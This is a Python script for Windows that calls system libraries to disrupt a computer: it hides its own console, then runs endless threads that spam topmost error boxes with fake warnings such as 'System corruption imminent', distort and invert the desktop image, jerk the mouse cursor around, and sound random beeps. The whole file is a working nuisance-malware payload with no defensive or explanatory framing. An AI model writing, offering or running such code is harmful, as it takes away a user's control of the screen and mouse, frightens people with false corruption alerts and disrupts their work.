import ctypes
import random
import threading
import time

user32 = ctypes.windll.user32
gdi32 = ctypes.windll.gdi32
kernel32 = ctypes.windll.kernel32

# Make process DPI aware for accurate screen metrics
try:
  ctypes.windll.shcore.SetProcessDpiAwareness(2)
except:
  try:
    user32.SetProcessDPIAware()
  except:
    pass

SCREEN_WIDTH = user32.GetSystemMetrics(0)
SCREEN_HEIGHT = user32.GetSystemMetrics(1)


def message_box_storm():
  """Spams native Win32 message boxes concurrently."""
  messages = [
      "The butterflies have arrived.",
      "System corruption imminent.",
      "Metamorphosis complete.",
      "No escape.",
  ]
  while True:
    try:
      title = "System Alert"
      text = random.choice(messages)
      # MB_ICONERROR | MB_OK | MB_TOPMOST
      user32.MessageBoxW(0, text, title, 0x00000010 | 0x00000000 | 0x00040000)
    except:
      pass
    time.sleep(0.3)


def screen_glitch_effect():
  """Performs advanced GDI screen shifting and color inversion chaos."""
  hwnd = user32.GetDesktopWindow()
  hdc = user32.GetDC(hwnd)

  while True:
    try:
      # Random screen distortion using BitBlt offsets
      x1 = random.randint(-20, 20)
      y1 = random.randint(-20, 20)
      gdi32.BitBlt(
          hdc,
          x1,
          y1,
          SCREEN_WIDTH,
          SCREEN_HEIGHT,
          hdc,
          0,
          0,
          0x00CC0020,  # SRCCOPY
      )

      # Occasional screen inversion flash
      if random.random() < 0.15:
        gdi32.PatBlt(
            hdc,
            0,
            0,
            SCREEN_WIDTH,
            SCREEN_HEIGHT,
            0x00550009,  # PATINVERT
        )
    except:
      pass
    time.sleep(0.05)


def cursor_jitter():
  """Aggressively jitters the mouse cursor across the screen."""
  while True:
    try:
      x = random.randint(100, SCREEN_WIDTH - 100)
      y = random.randint(100, SCREEN_HEIGHT - 100)
      user32.SetCursorPos(x, y)
    except:
      pass
    time.sleep(0.1)


def audio_chaos():
  """Generates system alert beeps."""
  while True:
    try:
      kernel32.Beep(random.randint(400, 2000), random.randint(50, 200))
    except:
      pass
    time.sleep(0.2)


if __name__ == "__main__":
  # Ensure console window is hidden for maximum immersion
  try:
    kernel32.FreeConsole()
  except:
    pass

  # Launch multi-threaded system-level disruption vectors
  threads = [
      threading.Thread(target=message_box_storm, daemon=True),
      threading.Thread(target=message_box_storm, daemon=True),
      threading.Thread(target=screen_glitch_effect, daemon=True),
      threading.Thread(target=cursor_jitter, daemon=True),
      threading.Thread(target=audio_chaos, daemon=True),
  ]

  for t in threads:
    t.start()

  # Keep main thread alive
  while True:
    time.sleep(1)
